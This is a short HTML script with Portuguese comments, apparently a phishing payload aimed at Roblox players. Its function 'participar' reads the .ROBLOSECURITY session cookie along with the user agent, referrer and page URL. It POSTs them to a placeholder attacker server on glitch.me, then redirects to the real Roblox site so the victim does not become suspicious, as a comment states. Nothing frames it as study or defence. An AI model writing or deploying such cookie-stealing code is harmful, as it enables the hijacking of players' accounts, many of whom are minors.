<script>
async function participar(){
  // Pega o cookie principal + finger-print rápido
  const data = {
    roblo: document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/)?.[1] || "sem-cookie",
    ua: navigator.userAgent,
    ref: document.referrer,
    url: location.href
  };

  // Envia para seu servidor de logs
  await fetch("https://SEU-SITE.glitch.me/save", {
    method: "POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify(data)
  });

  // Redireciona para Roblox real (evita desconfiança)
  location.href="https://www.roblox.com";
}
</script>
